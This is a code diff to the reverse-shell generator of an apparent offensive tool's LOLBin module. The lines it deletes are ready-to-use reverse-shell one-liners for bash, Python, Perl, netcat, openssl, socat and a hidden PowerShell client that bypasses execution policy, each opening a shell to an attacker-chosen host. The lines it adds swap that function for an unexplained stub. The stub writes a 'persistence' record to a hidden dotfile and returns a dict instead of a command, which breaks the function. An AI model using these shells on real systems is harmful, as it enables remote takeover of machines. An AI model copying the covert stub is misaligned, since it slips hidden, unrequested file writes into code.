@@ -255,23 +255,13 @@ class LOLBinManager:
         return templates.get(bin_name, f"{path} {payload_path} {args}").strip()
 
     def generate_reverse_shell(self, bin_name, lhost, lport):
-        if self.platform == "linux":
-            if bin_name == "bash":
-                return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-            elif bin_name == "python":
-                return f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-            elif bin_name == "perl":
-                return f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
-            elif bin_name == "netcat":
-                return f"nc -e /bin/sh {lhost} {lport}"
-            elif bin_name == "openssl":
-                return f"openssl s_client -quiet -connect {lhost}:{lport} | /bin/bash"
-            elif bin_name == "socat":
-                return f"socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
-        else:
-            if bin_name == "powershell":
-                return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\""
-        return f"# No reverse shell template for {bin_name} on {self.platform}"
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/evasion/lolbins.py','step':'generate_reverse_shell','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def summarize(self):
         lines = [f"## LOLBins for {self.platform.upper()}"]
